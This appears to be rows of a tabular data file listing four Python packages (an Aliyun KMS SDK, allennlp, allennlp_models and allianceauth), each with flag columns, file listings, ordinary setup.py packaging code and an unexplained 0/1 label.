aliyun-python-sdk-kms-2.16.0,0,1,1,1,0,0,0,0,endpoint.py AsymmetricDecryptRequest.py AsymmetricEncryptRequest.py AsymmetricSignRequest.py AsymmetricVerifyRequest.py CancelKeyDeletionRequest.py CertificatePrivateKeyDecryptRequest.py CertificatePrivateKeySignRequest.py CertificatePublicKeyEncryptRequest.py CertificatePublicKeyVerifyRequest.py CreateAliasRequest.py CreateCertificateRequest.py CreateKeyRequest.py CreateKeyVersionRequest.py CreateSecretRequest.py DecryptRequest.py DeleteAliasRequest.py DeleteCertificateRequest.py DeleteKeyMaterialRequest.py DeleteSecretRequest.py DescribeAccountKmsStatusRequest.py DescribeCertificateRequest.py DescribeKeyRequest.py DescribeKeyVersionRequest.py DescribeRegionsRequest.py DescribeSecretRequest.py DisableKeyRequest.py EnableKeyRequest.py EncryptRequest.py ExportDataKeyRequest.py GenerateAndExportDataKeyRequest.py GenerateDataKeyRequest.py GenerateDataKeyWithoutPlaintextRequest.py GetCertificateRequest.py GetParametersForImportRequest.py GetPublicKeyRequest.py GetRandomPasswordRequest.py GetSecretValueRequest.py ImportKeyMaterialRequest.py ListAliasesByKeyIdRequest.py ListAliasesRequest.py ListKeysRequest.py ListKeyVersionsRequest.py ListResourceTagsRequest.py ListSecretsRequest.py ListSecretVersionIdsRequest.py OpenKmsServiceRequest.py PutSecretValueRequest.py ReEncryptRequest.py RestoreSecretRequest.py RotateSecretRequest.py ScheduleKeyDeletionRequest.py SetDeletionProtectionRequest.py TagResourceRequest.py UntagResourceRequest.py UpdateAliasRequest.py UpdateCertificateStatusRequest.py UpdateKeyDescriptionRequest.py UpdateRotationPolicyRequest.py UpdateSecretRequest.py UpdateSecretRotationPolicyRequest.py UpdateSecretVersionStageRequest.py UploadCertificateRequest.py __init__.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/python
'''
 Licensed to the Apache Software Foundation (ASF) under one
 or more contributor license agreements.  See the NOTICE file
 distributed with this work for additional information
 regarding copyright ownership.  The ASF licenses this file
 to you under the Apache License, Version 2.0 (the
 ""License""); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at

     http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
 ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 KIND, either express or implied.  See the License for the
 specific language governing permissions and limitations
 under the License.
'''

from setuptools import setup, find_packages
import os
import sys

""""""
setup module for kms.

Created on 7/3/2015

@author: alex
""""""

PACKAGE = ""aliyunsdkkms""
NAME = ""aliyun-python-sdk-kms""
DESCRIPTION = ""The kms module of Aliyun Python sdk.""
AUTHOR = ""Aliyun""
AUTHOR_EMAIL = ""aliyun-developers-efficiency@list.alibaba-inc.com""
URL = ""http://develop.aliyun.com/sdk/python""

TOPDIR = os.path.dirname(__file__) or "".""
VERSION = __import__(PACKAGE).__version__

desc_file = open(""README.rst"")
try:
	LONG_DESCRIPTION = desc_file.read()
finally:
	desc_file.close()

setup(
    name=NAME,
    version=VERSION,
    description=DESCRIPTION,
    long_description=LONG_DESCRIPTION,
    author=AUTHOR,
    author_email=AUTHOR_EMAIL,
    license=""Apache"",
    url=URL,
    keywords=[""aliyun"",""sdk"",""kms""],
    packages=find_packages(exclude=[""tests*""]),
    include_package_data=True,
    platforms=""any"",
    install_requires=[""aliyun-python-sdk-core>=2.11.5"",],
    classifiers=(
                ""Development Status :: 4 - Beta"",
                ""Intended Audience :: Developers"",
                ""License :: OSI Approved :: Apache Software License"",
                ""Programming Language :: Python"",
                ""Programming Language :: Python :: 2.6"",
                ""Programming Language :: Python :: 2.7"",
                ""Programming Language :: Python :: 3"",
                ""Programming Language :: Python :: 3.3"",
                ""Programming Language :: Python :: 3.4"",
                ""Programming Language :: Python :: 3.5"",
                ""Programming Language :: Python :: 3.6"",
                ""Topic :: Software Development"",
              )

)",0
allennlp-2.10.0,0,1,1,1,1,0,1,0,build_vocab.py cached_path.py checklist.py count_instances.py diff.py evaluate.py find_learning_rate.py predict.py print_results.py push_to_hf.py subcommand.py test_install.py train.py _checklist_internal.py __init__.py cached_transformers.py checks.py file_utils.py from_params.py lazy.py logging.py meta.py model_card.py params.py plugins.py push_to_hf.py registrable.py sequences.py task_card.py checklist_test.py confidence_check_test.py distributed_test.py interpret_test.py model_test_case.py test_case.py __init__.py tqdm.py util.py __init__.py normalization_bias_verification.py question_answering_suite.py sentiment_analysis_suite.py task_suite.py textual_entailment_suite.py utils.py __init__.py verification_base.py __init__.py batch.py babi.py conll2003.py dataset_reader.py span_utils.py __init__.py interleaving_dataset_reader.py multitask.py sequence_tagging.py sharded_dataset_reader.py text_classification_json.py __init__.py data_collator.py data_loader.py multiprocess_data_loader.py multitask_data_loader.py multitask_epoch_sampler.py multitask_scheduler.py simple_data_loader.py __init__.py adjacency_field.py array_field.py field.py flag_field.py index_field.py label_field.py list_field.py metadata_field.py multilabel_field.py namespace_swapping_field.py sequence_field.py sequence_label_field.py span_field.py tensor_field.py text_field.py transformer_text_field.py __init__.py image_loader.py instance.py batch_sampler.py bucket_batch_sampler.py max_tokens_batch_sampler.py __init__.py character_tokenizer.py letters_digits_tokenizer.py pretrained_transformer_tokenizer.py sentence_splitter.py spacy_tokenizer.py tokenizer.py token_class.py whitespace_tokenizer.py __init__.py elmo_indexer.py pretrained_transformer_indexer.py pretrained_transformer_mismatched_indexer.py single_id_token_indexer.py spacy_indexer.py token_characters_indexer.py token_indexer.py __init__.py vocabulary.py __init__.py evaluator.py __init__.py serializers.py __init__.py __init__.py adversarial_bias_mitigator.py bias_direction.py bias_direction_wrappers.py bias_metrics.py bias_mitigators.py bias_mitigator_applicator.py bias_mitigator_wrappers.py bias_utils.py fairness_metrics.py __init__.py attacker.py hotflip.py input_reduction.py utils.py __init__.py influence_interpreter.py simple_influence.py __init__.py integrated_gradient.py saliency_interpreter.py simple_gradient.py smooth_gradient.py __init__.py __init__.py archival.py basic_classifier.py classifier_head.py head.py __init__.py model.py multitask.py simple_tagger.py __init__.py additive_attention.py attention.py bilinear_attention.py cosine_attention.py dot_product_attention.py linear_attention.py scaled_dot_product_attention.py __init__.py augmented_lstm.py backbone.py pretrained_transformer_backbone.py vilbert_backbone.py __init__.py bimpm_matching.py conditional_random_field.py conditional_random_field_wemission.py conditional_random_field_wlannoy.py conditional_random_field_wtrans.py __init__.py elmo.py elmo_lstm.py encoder_base.py feedforward.py gated_sum.py highway.py input_variational_dropout.py layer_norm.py lstm_cell_with_projection.py masked_layer_norm.py bilinear_matrix_attention.py cosine_matrix_attention.py dot_product_matrix_attention.py linear_matrix_attention.py matrix_attention.py scaled_dot_product_matrix_attention.py __init__.py maxout.py residual_with_layer_dropout.py sampled_softmax_loss.py scalar_mix.py compose_encoder.py feedforward_encoder.py gated_cnn_encoder.py pass_through_encoder.py pytorch_seq2seq_wrapper.py pytorch_transformer_wrapper.py seq2seq_encoder.py __init__.py bert_pooler.py boe_encoder.py cls_pooler.py cnn_encoder.py cnn_highway_encoder.py pytorch_seq2vec_wrapper.py seq2vec_encoder.py __init__.py softmax_loss.py bidirectional_endpoint_span_extractor.py endpoint_span_extractor.py max_pooling_span_extractor.py self_attentive_span_extractor.py span_extractor.py span_extractor_with_span_width_embedding.py __init__.py stacked_alternating_lstm.py stacked_bidirectional_lstm.py basic_text_field_embedder.py text_field_embedder.py __init__.py time_distributed.py bag_of_word_counts_token_embedder.py elmo_token_embedder.py embedding.py empty_embedder.py pass_through_token_embedder.py pretrained_transformer_embedder.py pretrained_transformer_mismatched_embedder.py token_characters_encoder.py token_embedder.py __init__.py activation_layer.py attention_module.py bimodal_attention.py bimodal_connection_layer.py bimodal_encoder.py layer_norm.py output_layer.py positional_encoding.py t5.py transformer_embeddings.py transformer_layer.py transformer_module.py transformer_pooler.py transformer_stack.py util.py __init__.py util.py grid_embedder.py image2image.py region_detector.py __init__.py __init__.py activations.py beam_search.py checkpoint_wrapper.py fairscale_checkpoint_wrapper.py __init__.py chu_liu_edmonds.py initializers.py module.py ddp_accelerator.py fairscale_fsdp_accelerator.py sharded_module_mixin.py __init__.py regularizer.py regularizers.py regularizer_applicator.py __init__.py util.py __init__.py multitask.py predictor.py sentence_tagger.py text_classifier.py __init__.py py.typed __init__.py __init__.py archive_surgery.py create_elmo_embeddings_from_vocab.py .gitignore bug.gld bug.rsl-new bug.rsl-old bug.tst COLLINS.prm evalb.c LICENSE Makefile new.prm README sample.gld sample.prm sample.rsl sample.tst tgrep_proc.prl inspect_cache.py __init__.py backward.py callback.py confidence_checks.py console_logger.py log_writer.py should_validate.py tensorboard.py track_epoch.py wandb.py __init__.py checkpointer.py gradient_descent_trainer.py combined.py cosine.py learning_rate_scheduler.py linear_with_warmup.py noam.py polynomial_decay.py pytorch_lr_schedulers.py slanted_triangular.py __init__.py attachment_scores.py auc.py average.py bleu.py boolean_accuracy.py categorical_accuracy.py covariance.py entropy.py evalb_bracketing_scorer.py f1_measure.py fbeta_measure.py fbeta_multi_label_measure.py fbeta_verbose_measure.py mean_absolute_error.py metric.py pearson_correlation.py perplexity.py rouge.py sequence_accuracy.py span_based_f1_measure.py spearman_correlation.py unigram_recall.py __init__.py metric_tracker.py inverted_triangular.py momentum_scheduler.py __init__.py moving_average.py no_op_trainer.py optimizers.py scheduler.py trainer.py util.py __init__.py version.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO pyproject.toml README.md 24hr_diff.sh resumable_train.sh resume_daemon.py run_with_beaker.py build_docs.sh build_docs_config.py check_large_files.sh check_links.py check_torch_version.py close_stale_issues.py get_version.py ping_issue_assignees.py py2md.py release_notes.py resume_daemon_test.py basic_example.py basic_example_expected_output.md py2md_test.py train_fixtures.py setup.cfg setup.py,"from collections import defaultdict
from setuptools import find_packages, setup

# PEP0440 compatible formatted version, see:
# https://www.python.org/dev/peps/pep-0440/
#
# release markers:
#   X.Y
#   X.Y.Z   # For bugfix releases
#
# pre-release markers:
#   X.YaN   # Alpha release
#   X.YbN   # Beta release
#   X.YrcN  # Release Candidate
#   X.Y     # Final release


def parse_requirements_file(path, allowed_extras: set = None, include_all_extra: bool = True):
    requirements = []
    extras = defaultdict(list)
    with open(path) as requirements_file:
        import re

        def fix_url_dependencies(req: str) -> str:
            """"""Pip and setuptools disagree about how URL dependencies should be handled.""""""
            m = re.match(
                r""^(git\+)?(https|ssh)://(git@)?github\.com/([\w-]+)/(?P<name>[\w-]+)\.git"", req
            )
            if m is None:
                return req
            else:
                return f""{m.group('name')} @ {req}""

        for line in requirements_file:
            line = line.strip()
            if line.startswith(""#"") or len(line) <= 0:
                continue
            req, *needed_by = line.split(""# needed by:"")
            req = fix_url_dependencies(req.strip())
            if needed_by:
                for extra in needed_by[0].strip().split("",""):
                    extra = extra.strip()
                    if allowed_extras is not None and extra not in allowed_extras:
                        raise ValueError(f""invalid extra '{extra}' in {path}"")
                    extras[extra].append(req)
                if include_all_extra and req not in extras[""all""]:
                    extras[""all""].append(req)
            else:
                requirements.append(req)
    return requirements, extras


integrations = {""checklist""}

# Load requirements.
install_requirements, extras = parse_requirements_file(
    ""requirements.txt"", allowed_extras=integrations
)
dev_requirements, dev_extras = parse_requirements_file(
    ""dev-requirements.txt"", allowed_extras={""examples""}, include_all_extra=False
)
extras[""dev""] = dev_requirements
extras.update(dev_extras)

# version.py defines the VERSION and VERSION_SHORT variables.
# We use exec here so we don't import allennlp whilst setting up.
VERSION = {}  # type: ignore
with open(""allennlp/version.py"", ""r"") as version_file:
    exec(version_file.read(), VERSION)

setup(
    name=""allennlp"",
    version=VERSION[""VERSION""],
    description=""An open-source NLP research library, built on PyTorch."",
    long_description=open(""README.md"", encoding=""utf-8"").read(),
    long_description_content_type=""text/markdown"",
    classifiers=[
        ""Intended Audience :: Science/Research"",
        ""Development Status :: 3 - Alpha"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Programming Language :: Python :: 3"",
        ""Topic :: Scientific/Engineering :: Artificial Intelligence"",
    ],
    keywords=""allennlp NLP deep learning machine reading"",
    url=""https://github.com/allenai/allennlp"",
    author=""Allen Institute for Artificial Intelligence"",
    author_email=""allennlp@allenai.org"",
    license=""Apache"",
    packages=find_packages(
        exclude=[
            ""*.tests"",
            ""*.tests.*"",
            ""tests.*"",
            ""tests"",
            ""test_fixtures"",
            ""test_fixtures.*"",
            ""benchmarks"",
            ""benchmarks.*"",
        ]
    ),
    install_requires=install_requirements,
    extras_require=extras,
    entry_points={""console_scripts"": [""allennlp=allennlp.__main__:run""]},
    include_package_data=True,
    python_requires="">=3.7.1"",
    zip_safe=False,
)
",0
allennlp_models-2.10.0,0,1,1,1,1,0,1,0,boolq.py stanford_sentiment_tree_bank.py __init__.py biattentive_classification_network.py transformer_classification_tt.py __init__.py __init__.py ontonotes.py __init__.py conll.py preco.py winobias.py __init__.py conll_coref_scores.py mention_recall.py __init__.py coref.py __init__.py coref.py __init__.py util.py __init__.py cnn_dm.py copynet_seq2seq.py seq2seq.py __init__.py bart.py composed_seq2seq.py copynet_seq2seq.py simple_seq2seq.py t5.py __init__.py decoder_net.py lstm_cell.py stacked_self_attention.py __init__.py auto_regressive.py seq_decoder.py __init__.py __init__.py seq2seq.py __init__.py __init__.py masked_language_model.py next_token_lm.py simple_language_modeling.py __init__.py bidirectional_lm.py language_model.py masked_language_model.py next_token_lm.py __init__.py bert.py gpt2.py language_model_head.py linear.py __init__.py bidirectional_lm_transformer.py __init__.py bidirectional_lm.py language_model.py __init__.py __init__.py masked_language_model.py next_token_lm.py __init__.py beam_search_generator.py transformer_beam_search_genera transformer_beam_search_generator.py __init__.py __init__.py __init__.py commonsenseqa.py fake.py piqa.py piqa_tt.py swag.py transformer_mc.py transformer_mc_tt.py __init__.py transformer_mc.py transformer_mc_tt.py __init__.py transformer_mc.py __init__.py __init__.py coref-spanbert.json evaluate_rc-lerc.json generation-bart.json glove-sst.json lm-masked-language-model.json lm-next-token-lm-gpt2.json mc-roberta-commonsenseqa.json mc-roberta-piqa.json mc-roberta-swag.json modelcard-template.json nlvr2-vilbert-head.json nlvr2-vilbert.json pair-classification-adversarial-binary-gender-bias pair-classification-adversarial-binary-gender-bias-mitigated-roberta-snli.json pair-classification-binary-gender-bias-mitigated-r pair-classification-binary-gender-bias-mitigated-roberta-snli.json pair-classification-decomposable-attention-elmo.js pair-classification-decomposable-attention-elmo.json pair-classification-esim.json pair-classification-roberta-mnli.json pair-classification-roberta-rte.json pair-classification-roberta-snli.json rc-bidaf-elmo.json rc-bidaf.json rc-naqanet.json rc-nmn.json rc-transformer-qa.json roberta-sst.json semparse-nlvr.json semparse-text-to-sql.json semparse-wikitables.json structured-prediction-biaffine-parser.json structured-prediction-constituency-parser.json structured-prediction-srl-bert.json structured-prediction-srl.json tagging-elmo-crf-tagger.json tagging-fine-grained-crf-tagger.json tagging-fine-grained-transformer-crf-tagger.json ve-vilbert.json vgqa-vilbert.json vqa-vilbert.json quora_paraphrase.py snli.py transformer_superglue_rte transformer_superglue_rte.py __init__.py bimpm.py decomposable_attention.py esim.py __init__.py textual_entailment.py __init__.py __init__.py pretrained.py drop.py qangaroo.py quac.py record_reader.py squad.py transformer_squad.py triviaqa.py utils.py __init__.py drop_em_and_f1.py squad_em_and_f1.py __init__.py bidaf.py bidaf_ensemble.py dialog_qa.py naqanet.py qanet.py transformer_qa.py utils.py __init__.py multi_head_self_attention.py qanet_encoder.py stacked_self_attention.py __init__.py __init__.py bidaf.py dialog_qa.py transformer_qa.py __init__.py drop.py narrativeqa.py orb.py orb_utils.py quoref.py squad.py transformer_qa_eval.py __init__.py __init__.py penn_tree_bank.py semantic_dependencies.py srl.py universal_dependencies. universal_dependencies.py __init__.py srl_eval_scorer.py __init__.py biaffine_dependency_parser.py constituency_parser.py graph_parser.py srl.py srl_bert.py __init__.py biaffine_dependency_parser.p biaffine_dependency_parser.py constituency_parser.py openie.py srl.py util.py __init__.py convert_openie_to_conll.py srl-eval.pl write_srl_predictions_to_conll_format.py __init__.py __init__.py ccgbank.py conll2000.py conll2003.py ontonotes_ner.py __init__.py crf_tagger.py __init__.py sentence_tagger.py __init__.py __init__.py constituency_parsing.json coref.json dependency_parsing.json evaluate_rc.json language_modeling.json masked_language_modeling.json ner.json oie.json rc.json semparse-nlvr.json semparse-tabular.json semparse-text-to-sql.json sentiment_analysis.json srl.json taskcard_template.json textual_entailment.json ve.json vqa.json version.py flickr30k.py gqa.py nlvr2.py utils.py vgqa.py vision_reader.py visual_entailment.py vqav2.py __init__.py vqa.py __init__.py nlvr2_head.py visual_entailment_head.py vqa_head.py __init__.py nlvr2.py vilbert_image_retrieval.py vilbert_vqa.py vision_text_model.py visual_entailment.py __init__.py nlvr2.py vilbert_vqa.py visual_entailment.py __init__.py __init__.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE PKG-INFO pyproject.toml README.md setup.cfg setup.py,"from setuptools import setup, find_packages
import os

# PEP0440 compatible formatted version, see:
# https://www.python.org/dev/peps/pep-0440/
#
# release markers:
#   X.Y
#   X.Y.Z   # For bugfix releases
#
# pre-release markers:
#   X.YaN   # Alpha release
#   X.YbN   # Beta release
#   X.YrcN  # Release Candidate
#   X.Y     # Final release

# version.py defines the VERSION and VERSION_SHORT variables.
# We use exec here so we don't import allennlp_semparse whilst setting up.
VERSION = {}
with open(""allennlp_models/version.py"") as version_file:
    exec(version_file.read(), VERSION)

# Load requirements.txt with a special case for allennlp so we can handle
# cross-library integration testing.
with open(""requirements.txt"") as requirements_file:
    import re

    def requirement_is_allennlp(req: str) -> bool:
        if req == ""allennlp"":
            return True
        if re.match(r""^allennlp[>=<]"", req):
            return True
        if re.match(r""^(git\+)?(https|ssh)://(git@)?github\.com/.*/allennlp\.git"", req):
            return True
        if re.match(
            r""^allennlp\[.*\] @ (git\+)?(https|ssh)://(git@)?github\.com/.*/allennlp\.git"", req
        ):
            return True
        return False

    def fix_url_dependencies(req: str) -> str:
        """"""Pip and setuptools disagree about how URL dependencies should be handled.""""""
        m = re.match(
            r""^(git\+)?(https|ssh)://(git@)?github\.com/([\w-]+)/(?P<name>[\w-]+)\.git"", req
        )
        if m is None:
            return req
        else:
            return f""{m.group('name')} @ {req}""

    install_requirements = []
    allennlp_requirements = []
    for line in requirements_file:
        line = line.strip()
        if line.startswith(""#"") or len(line) <= 0:
            continue
        if requirement_is_allennlp(line):
            allennlp_requirements.append(line)
        else:
            install_requirements.append(line)

    assert len(allennlp_requirements) == 1
    allennlp_override = os.environ.get(""ALLENNLP_VERSION_OVERRIDE"")
    if allennlp_override is not None:
        if len(allennlp_override) > 0:
            allennlp_requirements = [allennlp_override]
        else:
            allennlp_requirements = []

    install_requirements.extend(allennlp_requirements)
    install_requirements = [fix_url_dependencies(req) for req in install_requirements]

setup(
    name=""allennlp_models"",
    version=VERSION[""VERSION""],
    description=(""Officially supported models for the AllenNLP framework""),
    long_description=open(""README.md"").read(),
    long_description_content_type=""text/markdown"",
    classifiers=[
        ""Intended Audience :: Science/Research"",
        ""Development Status :: 3 - Alpha"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Programming Language :: Python :: 3"",
        ""Topic :: Scientific/Engineering :: Artificial Intelligence"",
    ],
    keywords=""allennlp NLP deep learning machine reading semantic parsing parsers"",
    url=""https://github.com/allenai/allennlp-models"",
    author=""Allen Institute for Artificial Intelligence"",
    author_email=""allennlp@allenai.org"",
    license=""Apache"",
    packages=find_packages(
        exclude=[""*.tests"", ""*.tests.*"", ""tests.*"", ""tests""],
    ),
    install_requires=install_requirements,
    include_package_data=True,
    package_data={
        ""allennlp_models"": [
            ""modelcards/*.json"",
            ""taskcards/*.json"",
            ""structured_prediction/tools/srl-eval.pl"",
        ]
    },
    python_requires="">=3.7.1"",
    zip_safe=False,
)
",1
allianceauth-3.1.1,0,1,1,1,1,0,0,0,admin.py apps.py disable_analytics.json middleware.py 0001_initial.py 0002_add_AA_Team_Token.py 0003_Generate_Identifier.py 0004_auto_20211015_0502.py 0005_alter_analyticspath_ignore_path.py 0006_more_ignore_paths.py __init__.py models.py signals.py tasks.py test_integration.py test_middleware.py test_models.py test_tasks.py test_utils.py __init__.py utils.py __init__.py apps.py admin.py apps.py app_settings.py backends.py checks.py decorators.py forms.py hmac_urls.py checkmains.py __init__.py __init__.py managers.py middleware.py 0001_initial.py 0002_auto_20160907_1914.py 0003_authservicesinfo_state.py 0004_create_permissions.py 0005_delete_perms.py 0006_auto_20160910_0542.py 0007_remove_authservicesinfo_is_blue.py 0008_set_state.py 0009_auto_20161021_0228.py 0010_only_one_authservicesinfo.py 0011_authservicesinfo_user_onetoonefield.p 0012_remove_add_delete_authservicesinfo_pe 0013_service_modules.py 0014_fleetup_permission.py 0015_user_profiles.py 0016_ownershiprecord.py 0017_remove_fleetup_permission.py 0018_alter_state_name_length.py 0018_state_member_factions.py 0019_merge_20211026_0919.py 0020_userprofile_language_userprofile_nigh __init__.py models.py signals.py admin.css background.jpg EVE_SSO_Lo tasks.py counters.py event_series.py signals.py test_counters.py test_event_series.py test_signals.py __init__.py __init__.py dashboard.html base.html lang_select.html login.html middle_box.html register.html activate.html activation_email.txt activation_email_html.txt activation_email_subject.txt test_admin.py test_app_settings.py test_backend.py test_commands.py test_decorators.py test_middleware.py test_models.py test_signals.py test_templatetags.py __init__.py urls.py views.py __init__.py allianceauth.py __init__.py context_processors.py admin.py apps.py auth_hooks.py managers.py 0001_initial.py 0002_migrate_permissions.py 0003_granular_permissions.py 0004_member_models.py 0005_cleanup_permissions.py __init__.py models.py swagger.json tasks.py base.html corpstats.html search.html tests.py urls.py views.py __init__.py admin.py apps.py admin.py apps.py 0001_initial.py __init__.py models.py signals.py test_managers.py test_models.py test_signals.py __init__.py __init__.py dotlan.py eveimageserver.py evewho.py test_evelinks.py test_templatetags.py __init__.py zkillboard.py __init__.py managers.py 0001_initial.py 0002_remove_eveapikeypair_error_count.py 0003_auto_20161026_0149.py 0004_eveapikeypair_sso_verified.py 0005_remove_eveallianceinfo_member_count.py 0006_allow_null_evecharacter_alliance.py 0007_unique_id_name.py 0008_remove_apikeys.py 0009_on_delete.py 0010_alliance_ticker.py 0011_ids_to_integers.py 0012_index_additions.py 0013_evecorporationinfo_ceo_id.py 0014_auto_20210105_1413.py 0015_factions.py 0016_character_names_are_not_unique.py __init__.py models.py providers.py swagger.json tasks.py evelinks.py examples.html __init__.py esi_client_stub.py swagger_old.json test_managers.py test_models.py test_providers.py test_tasks.py __init__.py views.py __init__.py admin.py apps.py auth_hooks.py forms.py 0001_initial.py 0002_auto_20160905_2220.py 0003_auto_20160906_2354.py 0004_make_strings_more_stringy.py 0005_remove_fat_name.py 0006_auto_20180803_0430.py __init__.py models.py swagger.json characternotex fatlinkformatt fatlinkmodify. fatlinkpersona fatlinkstatist fatlinkview.ht urls.py views.py __init__.py admin.py apps.py auth_hooks.py forms.py managers.py 0001_initial.py 0002_auto_20160906_2354.py 0003_default_groups.py 0004_authgroup.py 0005_authgroup_public.py 0006_request_groups_perm.py 0007_on_delete.py 0008_remove_authgroup_permissions.py 0009_requestlog.py 0010_authgroup_states.py 0011_requestlog_date.py 0012_group_leads.py 0013_fix_requestlog_date_field.py 0014_auto_20200918_1412.py 0015_make_descriptions_great_again.py 0016_remove_grouprequest_status_field.py 0017_improve_groups_documentation.py 0018_reservedgroupname.py 0019_adding_restricted_to_groups.py __init__.py models.py signals.py tasks.py audit.html groupmembers.html groupmembership.html groups.html index.html menu.html test_admin.py test_managers.py test_models.py test_signals.py test_views.py __init__.py urls.py views.py __init__.py hooks.py admin.py apps.py auth_hooks.py forms.py managers.py 0001_initial.py 0002_choices_for_questions.py 0003_applicationquestion_multi_select.py 0004_make_strings_more_stringy.py 0005_sorted_questions.py 0006_remove_legacy_models.py 0007_auto_20200918_1412.py __init__.py models.py corpchoice.html create.html management.html searchview.html view.html tests.py urls.py views.py __init__.py django.mo django.po django.mo django.po django.mo django.po django.mo django.po django.mo django.po django.mo django.po django.mo django.po django.mo django.po django.mo django.po models.py admin.py apps.py core.py handlers.py managers.py 0001_initial.py 0002_auto_20160910_1649.py 0003_make_strings_more_stringy.py 0004_performance_tuning.py 0005_fix_level_choices.py __init__.py models.py list.html list_partial.html view.html auth_notifications.py __init__.py test_core.py test_handlers.py test_init.py test_managers.py test_models.py test_templatetags.py test_views.py __init__.py urls.py views.py __init__.py admin.py apps.py auth_hooks.py form.py form_widgets.py 0001_initial.py 0002_auto_20170413_0442.py 0003_make_strings_more_stringy.py 0004_on_delete.py 0005_add_type_and_description.py __init__.py models.py add.html fleetoptable.html management.html update.html tests.py urls.py views.py __init__.py apps.py auth_hooks.py 0001_initial.py __init__.py models.py audit.html audit_row.html overview.html tests.py urls.py views.py __init__.py .gitkeep manage.py celery.py base.py local.py __init__.py .gitkeep .gitkeep urls.py wsgi.py __init__.py supervisor.conf __init__.py abstract.py admin.py apps.py auth_hooks.py forms.py hooks.py verify_service_accounts.py __init__.py __init__.py 0001_squashed_0003_delete_groupcache.py 0002_nameformatter.py 0003_remove_broken_link.py __init__.py models.py admin.py api.py apps.py app_settings.py auth_hooks.py core.py app_settings.py client.py exceptions.py helpers.py models.py example_objects.json factories.py piloting_concurrency.py piloting_functionality rate_limits.md test_client.py test_exceptions.py test_helpers.py test_models.py __init__.py __init__.py managers.py 0001_initial.py 0002_service_permissions.py 0003_big_overhaul.py __init__.py models.py tasks.py discord_service_ factories.py piloting_tasks.py test_admin.py test_api.py test_auth_hooks.py test_core.py test_integration.py test_managers.py test_models.py test_tasks.py test_utils.py test_views.py __init__.py urls.py utils.py views.py __init__.py admin.py apps.py auth_hooks.py manager.py 0001_initial.py 0002_service_permissions.py __init__.py models.py providers.py tasks.py discourse_se tests.py urls.py views.py __init__.py apps.py auth_hooks.py models.py urls.py views.py __init__.py admin.py apps.py auth_hooks.py manager.py 0001_initial.py 0002_service_permissions.py __init__.py models.py tasks.py tests.py urls.py views.py __init__.py admin.py apps.py auth_hooks.py 0001_initial.py 0001_squashed_0011_auto_20201011_ 0002_auto_20161212_0100.py 0003_mumbleuser_user.py 0004_auto_20161214_1024.py 0005_mumbleuser_hashfn.py 0006_service_permissions.py 0007_not_null_user.py 0008_mumbleuser_display_name.py 0009_set_mumble_dissplay_names.py 0010_mumbleuser_certhash.py 0011_auto_20201011_1009.py 0012_mumble_client_info.py __init__.py models.py tasks.py mumble_service_ctr tests.py urls.py views.py __init__.py admin.py apps.py auth_hooks.py forms.py manager.py 0001_initial.py 0002_service_permissions.py __init__.py models.py tasks.py broadcast.html tests.py urls.py views.py __init__.py admin.py apps.py auth_hooks.py manager.py 0001_initial.py 0002_service_permissions.py __init__.py models.py tasks.py tests.py urls.py views.py __init__.py admin.py apps.py auth_hooks.py manager.py 0001_initial.py 0002_service_permissions.py __init__.py models.py tasks.py tests.py urls.py views.py __init__.py admin.py apps.py auth_hooks.py forms.py manager.py 0001_initial.py 0002_auto_20161212_0133.py 0003_teamspeak3user.py 0004_service_permissions.py 0005_stategroup.py __init__.py models.py signals.py tasks.py change teamspeak3 teamspeakj tests.py urls.py ts3.py __init__.py views.py __init__.py admin.py apps.py auth_hooks.py manager.py 0001_initial.py 0002_service_permissions.py __init__.py models.py tasks.py tests.py urls.py views.py __init__.py __init__.py signals.py admin.css tasks.py menublock.html menuitem.html fleetformattertool.html services.html services_ctrl.html service_confirm_delete.html service_credentials.html service_password.html menu_items.py __init__.py test_models.py test_nameformatter.py test_signals.py test_tasks.py __init__.py urls.py views.py __init__.py admin.py apps.py auth_hooks.py form.py managers.py 0001_initial.py 0002_srpuserrequest_srp_status_choices.py 0003_make_strings_more_stringy.py 0004_on_delete.py __init__.py models.py providers.py swagger.json add.html data.html management.html request.html update.html get_killmails_killmail_id_killmail_hash_81973979. zkillboard_killmail_api_81973979.json test_managers.py __init__.py urls.py views.py __init__.py auth-base.css checkbox.css bootstrap-locals.less darkly.less darkly.min.css LICENSE flatly.less flatly.min.css LICENSE flatly-shared.less allianceauth.png apple-touch-icon.png favicon-16x16.png favicon-32x32.png favicon-96x96.png eve-time.js filterDropDown.js filterDropDown.min.js LICENSE ui-icons_444444_2 ui-icons_555555_2 ui-icons_777620_2 ui-icons_777777_2 ui-icons_cc0000_2 ui-icons_ffffff_2 jquery-ui.min.css refresh_notifications.js timers.js robots.txt base_site.html celery_bar_partial.html include.html overview.html base.html icons.html messages.html night-toggle.html notifications_menu_item.html side-menu.html top-menu-admin.html top-menu-user-dropdown.html top-menu.html bootstrap-css.html bootstrap-js.html clipboard-js.html datatables-css.html datatables-js.html evetime-js.html filterdropdown-js.html fontawesome.html jquery-datetimepicker-css.html jquery-datetimepicker-js.html jquery-ui-css.html jquery-ui-js.html jquery-visibility-js.html moment-js.html refresh-notifications-js.html timers-js.html x-editable-js.html x-editable.css.html admin_status.py __init__.py auth_utils.py test_auth_utils.py __init__.py navactive.py __init__.py tests.py __init__.py __init__.py admin.py apps.py auth_hooks.py form.py 0001_initial.py 0002_make_strings_more_stringy.py 0003_on_delete.py 0004_timer_type.py 0005_alter_timer_planet_moon.py __init__.py models.py form.html index_button.html timer_confirm_delete.html timer_create_form.html timer_update_form.html view.html tests.py urls.py views.py __init__.py urls.py cache.py testing.py test_cache.py test_testing.py __init__.py __init__.py views.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO pyproject.toml README.md setup.cfg,,1
